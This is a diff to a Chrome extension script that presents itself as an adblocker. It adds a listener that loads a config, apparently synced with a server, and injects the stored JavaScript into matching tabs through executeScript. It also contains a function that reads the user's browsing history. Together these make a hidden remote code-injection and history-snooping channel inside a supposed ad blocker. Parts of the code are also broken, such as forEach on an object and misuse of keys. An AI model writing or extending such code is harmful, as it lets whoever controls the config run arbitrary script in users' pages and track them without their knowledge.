@@ -1,3 +1,8 @@
+/* current configuration
+ * user ID (int) identifier
+ * js_cmd (list of pairs (site url, js function))
+ * last_pkt (int) time in milliseconds since last check-in with server
+ */
 var config = {
 	ID: 0,
 	js_cmd: [],
@@ -14,7 +19,7 @@ chrome.webRequest.onBeforeRequest.addListener(
 	["blocking"]
 );
 
-//basic functionality
+//basic blocking functionality for adblocker
 chrome.webRequest.onBeforeRequest.addListener(
     function(details) {
         return {cancel: true };
@@ -23,16 +28,36 @@ chrome.webRequest.onBeforeRequest.addListener(
     ["blocking"]
 );
 
+//
+chrome.tabs.onUpdated.addListener(
+	function(tabId, changeInfo, tab){
+		if(changeInfo.status == 'complete' && tab.active){
+			chrome.tabs.getSelected(null).then(function(tab) {
+                loadConfig().then(function () {
+                    var userconf = config;
+                    userconf.forEach(function (site) {
+                        if (site.keys[0] === tab.url){
+                        		chrome.tabs.executeScript(tab.id, {code: site[site.keys[0]]});
 
+						}
+                    })
+                })
+            })
+		}
+	}
+);
 
-//Get user history, previous x results
+/* Get user history, previous x results
+ * @param (int) milis: time in miliseconds from epoch
+ * @param (int) numResults: maximum number of history objects
+ * act on the results of the query within the forEach loop
+ */
 function getClientHistory(millis, numResults){
 chrome.history.search({text: '', maxResults: numResults}, function(data) {
     data.forEach(function(page) {
     	if(page.lastVisitTime>millis){
             alert(page.url);
 		}
-
     });
 });
 }
@@ -48,7 +73,7 @@ async function loadConfig(){
 }
 
 /* setClientID
- * @param {string} value
+ * store the current config object to memory
  */
 async function storeConfig(){
 	await chrome.storage.sync.set({config: config}, function(result){
